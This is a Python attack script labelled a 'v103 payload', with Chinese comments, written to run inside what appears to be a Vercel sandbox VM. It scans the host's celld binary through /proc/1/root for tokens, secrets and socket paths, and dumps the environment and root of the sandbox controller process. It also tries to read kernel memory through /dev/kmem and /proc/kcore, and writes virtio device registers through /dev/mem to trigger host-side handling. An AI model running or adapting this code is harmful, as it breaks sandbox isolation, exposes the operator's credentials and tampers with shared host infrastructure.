# -*- coding: utf-8 -*-
"""v103 payload: celld strings 提取 + sandboxctrl 定位 + RAM 读取通道测试
N1 python strings celld (36MB) -> 路由/URL/sock 关键字
N2 /proc/535 maps/exe/root 定位 sandboxctrl 二进制
N3 /dev/kmem + /proc/kcore 测 RAM 读
N4 virtio3 QueueNotify 写测试 (低风险)
输出 /vercel/sandbox/v103c.out"""
import os, socket, struct, time, subprocess, glob, signal, ctypes, re

OUT = '/vercel/sandbox/v103c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(240)


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def sh(cmd, t=8):
    try:
        r = subprocess.run(['/bin/sh', '-c', cmd], capture_output=True, timeout=t)
        return (r.stdout or b'') + (r.stderr or b'')
    except Exception as e:
        return ('EXC %s' % type(e).__name__).encode()


# ---------- N1 celld strings ----------
log('=== N1 celld strings ===')
try:
    fp = '/proc/1/root/opt/vercel/celld'
    sz = os.path.getsize(fp)
    log('celld size=%d' % sz)
    hits = set()
    pat = re.compile(rb'[ -~]{8,}')
    with open(fp, 'rb') as fh:
        chunk = b''
        while True:
            d = fh.read(0x400000)
            if not d:
                break
            chunk = (chunk + d)[-0x800000:]
            for s in pat.findall(d):
                sl = s.lower()
                if any(k in sl for k in (b'http', b'/v1/', b'/api', b'unix', b'vsock', b'spawn',
                                         b'sandbox', b'23456', b'.sock', b'listen', b':addr',
                                         b'token', b'secret', b'cell-id', b'init.sock', b'2050')):
                    hits.add(s[:180])
    log('celld hits: %d' % len(hits))
    for s in sorted(hits)[:120]:
        log('  ' + s.decode(errors='replace'))
except Exception as e:
    log('celld scan EXC %s' % type(e).__name__)


# ---------- N2 sandboxctrl 定位 ----------
log('=== N2 sandboxctrl locate ===')
for pid in ['535']:
    for fld in ['maps', 'exe', 'cwd', 'root', 'cmdline', 'environ', 'stat']:
        try:
            if fld == 'maps':
                d = open('/proc/%s/maps' % pid, errors='replace').read()
                log('PID %s maps: %s' % (pid, d[:1500]))
            elif fld == 'exe':
                log('PID %s exe -> %s' % (pid, os.readlink('/proc/%s/exe' % pid)))
            elif fld == 'cwd':
                log('PID %s cwd -> %s' % (pid, os.readlink('/proc/%s/cwd' % pid)))
            elif fld == 'root':
                log('PID %s root -> %s' % (pid, os.readlink('/proc/%s/root' % pid)))
            elif fld == 'cmdline':
                log('PID %s cmdline: %s' % (pid, open('/proc/%s/cmdline' % pid, 'rb').read().replace(b'\x00', b' ').decode(errors='replace')[:300]))
            elif fld == 'environ':
                env = open('/proc/%s/environ' % pid, 'rb').read()
                log('PID %s env: %s' % (pid, '; '.join(e.decode('latin1') for e in env.split(b'\x00') if e)[:1200]))
            else:
                log('PID %s %s: %s' % (pid, fld, open('/proc/%s/%s' % (pid, fld), errors='replace').read()[:400]))
        except Exception as e:
            log('PID %s %s EXC %s' % (pid, fld, type(e).__name__))
    # 根目录列表
    try:
        log('PID 535 root ls: %s' % sh('ls -la /proc/535/root/ 2>&1; ls -la /proc/535/root/opt/ 2>&1; ls -la /proc/535/root/opt/vercel/ 2>&1').decode(errors='replace')[:1500])
    except Exception:
        pass


# ---------- N3 RAM 读取通道 ----------
log('=== N3 RAM channels ===')
# /dev/kmem
log('kmem: ' + sh('mknod /dev/kmem c 1 2 2>&1; python3 -c "d=open(\'/dev/kmem\',\'rb\');d.seek(0x100000);print(d.read(16).hex())" 2>&1').decode(errors='replace')[:300])
# /proc/kcore
log('kcore: ' + sh('ls -la /proc/kcore 2>&1').decode(errors='replace')[:200])
try:
    d = open('/proc/kcore', 'rb')
    log('kcore open OK size=%d' % os.path.getsize('/proc/kcore'))
    d.close()
except Exception as e:
    log('kcore open FAIL %s' % type(e).__name__)


# ---------- N4 virtio3 notify 写测试 ----------
log('=== N4 virtio notify test ===')
libc = ctypes.CDLL(None, use_errno=True)
libc.open.restype = ctypes.c_int
libc.open.argtypes = [ctypes.c_char_p, ctypes.c_int]
libc.mmap.restype = ctypes.c_void_p
libc.mmap.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_long]
memfd = libc.open(b'/dev/mem', 2)
log('mem fd=%d' % memfd)
if memfd > 0:
    m = libc.mmap(None, 0x1000, 3, 1, memfd, 0xc0004000)
    if m not in (ctypes.c_void_p(-1).value, 0):
        # 写 QueueSel=0 (legacy 0x24) 读 QueueNumMax (0x28)
        ctypes.c_uint32.from_address(m + 0x24).value = 0
        time.sleep(0.05)
        log('legacy QueueSel=0 -> QueueNumMax=0x%x QueueNum=0x%x QueuePFN=0x%x' % (
            ctypes.c_uint32.from_address(m + 0x28).value,
            ctypes.c_uint32.from_address(m + 0x2c).value,
            ctypes.c_uint32.from_address(m + 0x34).value))
        # 写 legacy QueueNotify (0x38) 值 0 -> 触发 host 处理 (空队列, 低风险)
        ctypes.c_uint32.from_address(m + 0x38).value = 0
        time.sleep(0.05)
        log('notify wrote ok')
        # 写 QueueSel=1/2 看其他队列
        for q in (1, 2):
            ctypes.c_uint32.from_address(m + 0x24).value = q
            time.sleep(0.05)
            log('legacy QueueSel=%d -> QueueNumMax=0x%x QueueNum=0x%x QueuePFN=0x%x' % (
                q,
                ctypes.c_uint32.from_address(m + 0x28).value,
                ctypes.c_uint32.from_address(m + 0x2c).value,
                ctypes.c_uint32.from_address(m + 0x34).value))
        ctypes.CDLL(None).munmap(m, 0x1000)
    ctypes.CDLL(None).close(memfd)

log('V103C_DONE')
f.close()
